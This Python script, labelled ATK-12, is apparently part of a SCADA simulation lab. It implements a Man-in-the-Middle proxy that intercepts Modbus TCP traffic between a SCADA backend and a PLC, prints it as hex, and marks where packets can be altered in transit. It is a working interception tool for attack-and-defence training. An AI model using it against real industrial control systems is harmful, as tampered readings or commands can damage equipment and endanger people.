#!/usr/bin/env python3
"""
ATK-12 | Man-in-the-Middle (MitM) Modbus Proxy
===============================================
A Man-in-the-Middle attack intercepts the network traffic between the SCADA 
backend and the physical PLC. Because Modbus TCP contains no encryption or 
cryptographic signatures, a proxy can silently read and alter packets on the fly.

This script acts as a transparent TCP proxy. It listens on a local port, accepts
connections from the SCADA engine, and forwards them to the real PLC. Since all 
traffic passes through this script, you can inject logic to monitor or alter 
the hex bytes before forwarding them.

Usage
-----
    python atk12_mitm_proxy.py --listen_port 5022 --target_host 127.0.0.1 --target_port 5020

*Note: For the attack to work, you must point the TRINETRA simulation engine 
to connect to the Proxy (port 5022) instead of the actual IED (port 5020).*
"""
import socket
import threading
import argparse

def hexdump(data):
    """Returns a nicely formatted hex string for analyzing Modbus packets"""
    return " ".join(f"{b:02x}" for b in data)

def forward_traffic(src_socket, dst_socket, direction_label):
    """Reads packets from source, prints them, and forwards to destination."""
    while True:
        try:
            data = src_socket.recv(4096)
            if not data:
                break
            
            # -------------------------------------------------------------
            # [!] INJECTION POINT: MODIFY PACKETS ON-THE-FLY HERE
            # If Modbus TCP FC=03 (Read Registers) response, modify the payload!
            # Example: data = bytearray(data); data[10] = 0x00; data = bytes(data)
            # -------------------------------------------------------------
            
            print(f"[ {direction_label} ] {len(data)} bytes | Hex: {hexdump(data)}")
            
            # Forward the (potentially modified) packet to the destination
            dst_socket.sendall(data)
            
        except Exception as e:
            # Socket closed or network error
            break
            
    src_socket.close()
    dst_socket.close()

def handle_client(client_socket, client_address, target_host, target_port):
    print(f"\n[+] New SCADA connection intercepted from {client_address[0]}:{client_address[1]}")
    
    # Establish connection to the REAL PLC on behalf of the client
    target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        target_socket.connect((target_host, target_port))
        print(f"[+] Tunnel established to PLC at {target_host}:{target_port}")
    except Exception as e:
        print(f"[-] Could not connect to target PLC: {e}")
        client_socket.close()
        return

    # Create two threads to forward traffic in both directions
    scada_to_plc = threading.Thread(target=forward_traffic, args=(client_socket, target_socket, "SCADA -> PLC"))
    plc_to_scada = threading.Thread(target=forward_traffic, args=(target_socket, client_socket, "PLC -> SCADA"))

    scada_to_plc.start()
    plc_to_scada.start()

def main():
    parser = argparse.ArgumentParser(description="ATK-12: Man-in-the-Middle TCP Proxy for Modbus.")
    parser.add_argument("--listen_port", type=int, default=5020, help="Port to listen for incoming SCADA connections")
    parser.add_argument("--target_host", type=str, default="127.0.0.1", help="Real PLC IP address")
    parser.add_argument("--target_port", type=int, default=5021, help="Real PLC Modbus port (must be different if on same IP)")
    args = parser.parse_args()

    print("=" * 60)
    print("  ATK-12  |  Man-in-the-Middle Modbus Proxy")
    print("=" * 60)
    print(f"[*] Binding Proxy Listener to 0.0.0.0:{args.listen_port}")
    print(f"[*] Target PLC            : {args.target_host}:{args.target_port}")
    print("[*] Waiting for SCADA backend to connect...")

    # Start the proxy server
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("0.0.0.0", args.listen_port))
    server.listen(5)

    try:
        while True:
            client_socket, client_address = server.accept()
            # Handle each incoming SCADA connection in a new thread
            proxy_thread = threading.Thread(
                target=handle_client, 
                args=(client_socket, client_address, args.target_host, args.target_port)
            )
            proxy_thread.start()
            
    except KeyboardInterrupt:
        print("\n[!] Shutting down MitM Proxy.")
    finally:
        server.close()

if __name__ == "__main__":
    main()
